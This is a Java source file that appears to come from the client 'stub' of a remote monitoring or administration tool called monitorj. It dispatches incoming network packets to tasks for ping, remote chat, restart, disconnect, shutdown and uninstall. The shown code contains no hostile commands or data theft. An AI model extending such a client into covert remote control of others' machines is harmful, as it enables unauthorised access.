package me.jershdervis.monitorj.stub.client;

import me.jershdervis.monitorj.stub.client.tasks.*;
import me.jershdervis.monitorj.stub.eventapi.EventManager;
import me.jershdervis.monitorj.stub.eventapi.EventTarget;
import me.jershdervis.monitorj.stub.eventapi.events.EventReceivePacket;

import java.io.IOException;
import java.util.ArrayList;

/**
 * Created by Josh on 19/06/2015.
 */
public class PacketTaskManager {

    private ArrayList<PacketTask> packetTasks = new ArrayList<PacketTask>();

    public PacketTaskManager() {
        EventManager.register(this);

        this.addPacketTask(new PingTask());
        this.addPacketTask(new RemoteChatStartTask());
        this.addPacketTask(new RemoteChatStopTask());
        this.addPacketTask(new RemoteChatMessage());

        this.addPacketTask(new RestartClientApplicationTask());
        this.addPacketTask(new DisconnectClientTask());
        this.addPacketTask(new ShutdownClientApplicationTask());
        this.addPacketTask(new UninstallClientApplicationTask());
    }

    @EventTarget
    public void onReceivePacket(EventReceivePacket event) {
        for(PacketTask task : packetTasks) {
            if(event.getPacketID() == task.getPacketID()) {
                try {
                    task.run(event.getInputStream(), event.getOutputStream());
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
        }
    }

    public void addPacketTask(PacketTask packetTask) {
        this.packetTasks.add(packetTask);
    }

    public ArrayList<PacketTask> getPacketTasks() {
        return this.packetTasks;
    }
}
